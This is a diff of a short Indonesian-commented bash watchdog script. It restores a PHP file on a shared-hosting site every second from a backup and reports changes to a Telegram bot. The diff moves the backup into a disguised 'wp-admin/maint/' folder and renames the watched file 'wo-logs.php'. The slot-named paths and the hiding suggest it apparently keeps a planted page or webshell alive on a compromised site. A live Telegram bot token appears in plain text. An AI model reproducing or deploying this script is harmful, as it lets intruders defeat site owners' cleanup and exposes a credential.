@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Definisikan lokasi file index.php Permissions 755
-INDEX_FILE="/home/u0256282/public_html/kopkarlia.com/iboslot/index.php"
+INDEX_FILE="/home/u0256282/public_html/lbliagalaxy.com/wo-logs.php"
 # Definisikan lokasi folder backup Permissions 755
-BACKUP_FOLDER="/home/u0256282/public_html/car_colloquium/.tmb/"
+BACKUP_FOLDER="/home/u0256282/public_html/wp-admin/maint/"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
-BACKUP_FILE="$BACKUP_FOLDER/robotss"
+BACKUP_FILE="$BACKUP_FOLDER/file"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
@@ -37,10 +37,10 @@ monitor_file() {
 
         if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
             # Jika checksum berbeda, kembalikan file index.php dari backup
-            echo "Perubahan terdeteksi pada index.php, mengembalikan backup..."
+            echo "Change, mengembalikan backup..."
             cp "$BACKUP_FILE" "$INDEX_FILE"
             echo "index.php dikembalikan ke versi backup."
-            send_telegram_notification "Perubahan terdeteksi pada index.php. File dikembalikan ke versi backup."
+            send_telegram_notification "Change. Backup File."
         fi
 
         # Tunggu 1 detik sebelum pengecekan selanjutnya
